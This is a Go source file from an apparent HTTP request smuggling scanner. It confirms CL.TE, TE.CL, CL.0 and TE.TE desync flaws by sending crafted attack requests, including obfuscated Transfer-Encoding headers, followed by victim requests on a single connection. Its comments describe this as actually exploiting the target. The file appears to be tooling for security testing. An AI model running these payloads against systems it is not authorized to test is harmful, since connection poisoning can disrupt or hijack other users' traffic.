package detectors

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/byteoverride/desynctrace/internal/client"
	"github.com/byteoverride/desynctrace/internal/vectors"
	"github.com/rs/zerolog/log"
)

// ConfirmationDetector proves HTTP smuggling by actually poisoning a connection.
//
// It sends an attack request followed by a victim request on the SAME TCP socket.
// The attack smuggles a request to a unique canary path. If the victim's response
// matches the smuggled path's expected response (e.g., 404, or contains the canary),
// then smuggling is confirmed with high confidence.
//
// This is the most reliable detection method but also the most intrusive —
// it actually exploits the vulnerability on the target.
type ConfirmationDetector struct {
	Insecure    bool
	BaseHeaders map[string]string
	Attempts    int           // number of confirmation attempts (default 3)
	Timeout     time.Duration // per-request timeout (default 10s)
	Delay       time.Duration // delay between attack and victim (default 100ms)
	OnTraffic   TrafficLogger // optional callback to display raw traffic
}

func NewConfirmationDetector(headers map[string]string) *ConfirmationDetector {
	return &ConfirmationDetector{
		Insecure:    true,
		BaseHeaders: headers,
		Attempts:    3,
		Timeout:     10 * time.Second,
		Delay:       100 * time.Millisecond,
	}
}

func (d *ConfirmationDetector) Detect(target string, vector vectors.SmugglingVector) (*DetectionResult, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	host := u.Hostname()
	path := u.Path
	if path == "" {
		path = "/"
	}

	vtype := vector.Type()

	switch vtype {
	case vectors.CLTE:
		return d.confirmCLTE(target, host, path)
	case vectors.TECL:
		return d.confirmTECL(target, host, path)
	case vectors.CL0:
		return d.confirmCL0(target, host, path)
	case vectors.TETE:
		return d.confirmTETE(target, host, path)
	default:
		return &DetectionResult{IsVulnerable: false, Vector: vtype}, nil
	}
}

// confirmCLTE sends a CL.TE attack that smuggles a GET to a canary path,
// then sends a normal victim GET. If the victim gets a 404 or the canary
// path's response, smuggling is confirmed.
func (d *ConfirmationDetector) confirmCLTE(target, host, path string) (*DetectionResult, error) {
	canary := generateCanary()
	canaryPath := fmt.Sprintf("/%s", canary)

	successes := 0
	for i := 0; i < d.Attempts; i++ {
		pc := client.NewPipelinedClient(d.Timeout, d.Insecure)

		// Attack payload: CL.TE
		// Frontend sees Content-Length, forwards full body.
		// Backend sees Transfer-Encoding: chunked, reads the 0-chunk,
		// leaves the smuggled request prefix in the buffer.
		smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Canary: %s\r\n\r\n", canaryPath, host, canary)

		// Chunked encoding: we send 0-chunk, then the smuggled data sits after it.
		// The "0\r\n\r\n" terminates the chunked body for the backend.
		// Everything after it becomes the start of the next request.
		chunkedBody := fmt.Sprintf("0\r\n\r\n%s", smuggled)

		var attackHeaders []client.RawHeader
		for k, v := range d.BaseHeaders {
			attackHeaders = append(attackHeaders, client.RawHeader{Key: k, Value: v})
		}
		attackHeaders = append(attackHeaders,
			client.RawHeader{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
			client.RawHeader{Key: "Transfer-Encoding", Value: "chunked"},
			client.RawHeader{Key: "Content-Length", Value: fmt.Sprintf("%d", len(chunkedBody))},
			client.RawHeader{Key: "Connection", Value: "keep-alive"},
		)
		attackPayload := client.BuildRawRequest("POST", path, host, attackHeaders, []byte(chunkedBody))

		// Victim payload: normal GET
		victimPayload := client.BuildRawRequest("GET", path, host, []client.RawHeader{
			{Key: "Connection", Value: "keep-alive"},
		}, nil)

		attackResp, victimResp, err := pc.SendAttackAndVictim(target, attackPayload, victimPayload, d.Delay, d.Timeout)
		pc.Close()

		if d.OnTraffic != nil {
			d.OnTraffic(fmt.Sprintf("CL.TE confirm attack %d/%d", i+1, d.Attempts), attackPayload, attackResp, 0)
			d.OnTraffic(fmt.Sprintf("CL.TE confirm victim %d/%d", i+1, d.Attempts), victimPayload, victimResp, 0)
		}

		if err != nil {
			log.Debug().Err(err).Int("attempt", i+1).Msg("CL.TE confirmation attempt failed")
			continue
		}

		if d.isSmuggled(attackResp, victimResp, canary, canaryPath) {
			successes++
			log.Debug().Int("attempt", i+1).Msg("CL.TE confirmed via poisoning")
		}
	}

	if successes > 0 {
		confidence := 70 + (successes * 10)
		if confidence > 99 {
			confidence = 99
		}
		return &DetectionResult{
			IsVulnerable: true,
			Vector:       vectors.CLTE,
			Confidence:   confidence,
			Evidence: fmt.Sprintf("Connection poisoning confirmed: %d/%d attempts successfully smuggled requests. "+
				"Victim responses matched canary path behavior.", successes, d.Attempts),
			Technique: "connection-poisoning",
			Attempts:  d.Attempts,
			Successes: successes,
			Confirmed: true,
		}, nil
	}

	return &DetectionResult{IsVulnerable: false, Vector: vectors.CLTE}, nil
}

// confirmTECL sends a TE.CL attack.
// Frontend sees Transfer-Encoding: chunked and forwards the chunked body.
// Backend sees Content-Length (small) and reads only part of the body.
// The rest of the body is the smuggled request.
func (d *ConfirmationDetector) confirmTECL(target, host, path string) (*DetectionResult, error) {
	canary := generateCanary()
	canaryPath := fmt.Sprintf("/%s", canary)

	successes := 0
	for i := 0; i < d.Attempts; i++ {
		pc := client.NewPipelinedClient(d.Timeout, d.Insecure)

		// Smuggled request that will be left in the buffer
		smuggledReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Canary: %s\r\nContent-Length: 10\r\n\r\nx=", canaryPath, host, canary)

		// Build the chunked body:
		// chunk-size (hex) \r\n
		// chunk-data \r\n
		// 0 \r\n
		// \r\n
		chunkSize := fmt.Sprintf("%x", len(smuggledReq))
		chunkedBody := fmt.Sprintf("%s\r\n%s\r\n0\r\n\r\n", chunkSize, smuggledReq)

		// Content-Length is set to a small value — just enough for the chunk size line.
		// The backend reads this much and stops. The rest sits in the buffer.
		// We use len(chunkSize) + 2 (\r\n) = length of the first line of the chunked body.
		clValue := len(chunkSize) + 2

		var attackHeaders []client.RawHeader
		for k, v := range d.BaseHeaders {
			attackHeaders = append(attackHeaders, client.RawHeader{Key: k, Value: v})
		}
		attackHeaders = append(attackHeaders,
			client.RawHeader{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
			client.RawHeader{Key: "Transfer-Encoding", Value: "chunked"},
			client.RawHeader{Key: "Content-Length", Value: fmt.Sprintf("%d", clValue)},
			client.RawHeader{Key: "Connection", Value: "keep-alive"},
		)
		attackPayload := client.BuildRawRequest("POST", path, host, attackHeaders, []byte(chunkedBody))

		victimPayload := client.BuildRawRequest("GET", path, host, []client.RawHeader{
			{Key: "Connection", Value: "keep-alive"},
		}, nil)

		attackResp, victimResp, err := pc.SendAttackAndVictim(target, attackPayload, victimPayload, d.Delay, d.Timeout)
		pc.Close()

		if d.OnTraffic != nil {
			d.OnTraffic(fmt.Sprintf("TE.CL confirm attack %d/%d", i+1, d.Attempts), attackPayload, attackResp, 0)
			d.OnTraffic(fmt.Sprintf("TE.CL confirm victim %d/%d", i+1, d.Attempts), victimPayload, victimResp, 0)
		}

		if err != nil {
			log.Debug().Err(err).Int("attempt", i+1).Msg("TE.CL confirmation attempt failed")
			continue
		}

		if d.isSmuggled(attackResp, victimResp, canary, canaryPath) {
			successes++
			log.Debug().Int("attempt", i+1).Msg("TE.CL confirmed via poisoning")
		}
	}

	if successes > 0 {
		confidence := 70 + (successes * 10)
		if confidence > 99 {
			confidence = 99
		}
		return &DetectionResult{
			IsVulnerable: true,
			Vector:       vectors.TECL,
			Confidence:   confidence,
			Evidence: fmt.Sprintf("Connection poisoning confirmed: %d/%d attempts. "+
				"TE.CL desync verified via response mismatch on pipelined requests.", successes, d.Attempts),
			Technique: "connection-poisoning",
			Attempts:  d.Attempts,
			Successes: successes,
			Confirmed: true,
		}, nil
	}

	return &DetectionResult{IsVulnerable: false, Vector: vectors.TECL}, nil
}

// confirmCL0 tests for CL.0 — backend ignores the body of POST requests.
func (d *ConfirmationDetector) confirmCL0(target, host, path string) (*DetectionResult, error) {
	canary := generateCanary()
	canaryPath := fmt.Sprintf("/%s", canary)

	successes := 0
	for i := 0; i < d.Attempts; i++ {
		pc := client.NewPipelinedClient(d.Timeout, d.Insecure)

		// CL.0: Send POST with a body that IS a complete HTTP request.
		// The frontend forwards the body because it respects Content-Length.
		// The backend ignores the body (treats it as Content-Length: 0).
		// The body data becomes the start of the next request on the socket.
		smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nX-Canary: %s\r\n\r\n", canaryPath, host, canary)

		var attackHeaders []client.RawHeader
		for k, v := range d.BaseHeaders {
			attackHeaders = append(attackHeaders, client.RawHeader{Key: k, Value: v})
		}
		attackHeaders = append(attackHeaders,
			client.RawHeader{Key: "Content-Length", Value: fmt.Sprintf("%d", len(smuggled))},
			client.RawHeader{Key: "Connection", Value: "keep-alive"},
		)
		attackPayload := client.BuildRawRequest("POST", path, host, attackHeaders, []byte(smuggled))

		victimPayload := client.BuildRawRequest("GET", path, host, []client.RawHeader{
			{Key: "Connection", Value: "keep-alive"},
		}, nil)

		attackResp, victimResp, err := pc.SendAttackAndVictim(target, attackPayload, victimPayload, d.Delay, d.Timeout)
		pc.Close()

		if d.OnTraffic != nil {
			d.OnTraffic(fmt.Sprintf("CL.0 confirm attack %d/%d", i+1, d.Attempts), attackPayload, attackResp, 0)
			d.OnTraffic(fmt.Sprintf("CL.0 confirm victim %d/%d", i+1, d.Attempts), victimPayload, victimResp, 0)
		}

		if err != nil {
			log.Debug().Err(err).Int("attempt", i+1).Msg("CL.0 confirmation attempt failed")
			continue
		}

		if d.isSmuggled(attackResp, victimResp, canary, canaryPath) {
			successes++
			log.Debug().Int("attempt", i+1).Msg("CL.0 confirmed via poisoning")
		}
	}

	if successes > 0 {
		confidence := 70 + (successes * 10)
		if confidence > 99 {
			confidence = 99
		}
		return &DetectionResult{
			IsVulnerable: true,
			Vector:       vectors.CL0,
			Confidence:   confidence,
			Evidence: fmt.Sprintf("CL.0 confirmed: %d/%d attempts. Backend ignores POST body, "+
				"leaving it in the socket buffer as the next request.", successes, d.Attempts),
			Technique: "connection-poisoning",
			Attempts:  d.Attempts,
			Successes: successes,
			Confirmed: true,
		}, nil
	}

	return &DetectionResult{IsVulnerable: false, Vector: vectors.CL0}, nil
}

// confirmTETE tries confirming TE.TE by testing each obfuscation with poisoning.
func (d *ConfirmationDetector) confirmTETE(target, host, path string) (*DetectionResult, error) {
	canary := generateCanary()
	canaryPath := fmt.Sprintf("/%s", canary)

	obfuscations := []struct {
		name  string
		teKey string
		teVal string
	}{
		{"space-before-colon", "Transfer-Encoding ", "chunked"},
		{"tab-before-colon", "Transfer-Encoding\t", "chunked"},
		{"mixed-case", "TrAnSfEr-EnCoDiNg", "chunked"},
		{"double-te", "Transfer-Encoding", "chunked\r\nTransfer-Encoding: x"},
		{"chunked-comma-cow", "Transfer-Encoding", "chunked, cow"},
	}

	for _, obs := range obfuscations {
		successes := 0
		for i := 0; i < d.Attempts; i++ {
			pc := client.NewPipelinedClient(d.Timeout, d.Insecure)

			smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", canaryPath, host)
			chunkedBody := fmt.Sprintf("0\r\n\r\n%s", smuggled)

			rawHeaders := fmt.Sprintf("Host: %s\r\n", host)
			rawHeaders += "Content-Type: application/x-www-form-urlencoded\r\n"
			rawHeaders += fmt.Sprintf("Content-Length: %d\r\n", len(chunkedBody))
			rawHeaders += fmt.Sprintf("%s: %s\r\n", obs.teKey, obs.teVal)
			rawHeaders += "Connection: keep-alive\r\n"
			for k, v := range d.BaseHeaders {
				rawHeaders += fmt.Sprintf("%s: %s\r\n", k, v)
			}

			attackPayload := client.BuildRawRequestExact(
				fmt.Sprintf("POST %s HTTP/1.1", path),
				rawHeaders,
				[]byte(chunkedBody),
			)

			victimPayload := client.BuildRawRequest("GET", path, host, []client.RawHeader{
				{Key: "Connection", Value: "keep-alive"},
			}, nil)

			attackResp, victimResp, err := pc.SendAttackAndVictim(target, attackPayload, victimPayload, d.Delay, d.Timeout)
			pc.Close()

			if d.OnTraffic != nil {
				d.OnTraffic(fmt.Sprintf("TE.TE(%s) confirm attack %d/%d", obs.name, i+1, d.Attempts), attackPayload, attackResp, 0)
				d.OnTraffic(fmt.Sprintf("TE.TE(%s) confirm victim %d/%d", obs.name, i+1, d.Attempts), victimPayload, victimResp, 0)
			}

			if err != nil {
				continue
			}

			if d.isSmuggled(attackResp, victimResp, canary, canaryPath) {
				successes++
			}
		}

		if successes > 0 {
			confidence := 70 + (successes * 10)
			if confidence > 99 {
				confidence = 99
			}
			return &DetectionResult{
				IsVulnerable: true,
				Vector:       vectors.TETE,
				Confidence:   confidence,
				Evidence: fmt.Sprintf("TE.TE via '%s' obfuscation confirmed: %d/%d. "+
					"Obfuscated TE header causes frontend/backend parsing disagreement.",
					obs.name, successes, d.Attempts),
				Technique: "connection-poisoning-tete",
				Attempts:  d.Attempts,
				Successes: successes,
				Confirmed: true,
			}, nil
		}
	}

	return &DetectionResult{IsVulnerable: false, Vector: vectors.TETE}, nil
}

// isSmuggled checks if the victim response indicates it was affected by the smuggled request.
func (d *ConfirmationDetector) isSmuggled(attackResp, victimResp *client.RawHTTPResponse, canary, canaryPath string) bool {
	if victimResp == nil || victimResp.StatusCode == 0 {
		return false
	}

	// The victim response status code changed (e.g., got 404 for the canary path)
	if victimResp.StatusCode == 404 || victimResp.StatusCode == 405 {
		return true
	}

	// Check if victim response body contains our canary
	if strings.Contains(string(victimResp.Body), canary) {
		return true
	}

	// Check if victim response body contains the canary path
	if strings.Contains(string(victimResp.Body), canaryPath) {
		return true
	}

	// Check for a 400 Bad Request (common when smuggled bytes corrupt the victim)
	if victimResp.StatusCode == 400 {
		return true
	}

	// If the attack got a normal 200 but the victim got something unexpected
	if attackResp != nil && attackResp.StatusCode == 200 && victimResp.StatusCode != 200 {
		return true
	}

	return false
}

func generateCanary() string {
	b := make([]byte, 8)
	rand.Read(b)
	return "dt-" + hex.EncodeToString(b)
}
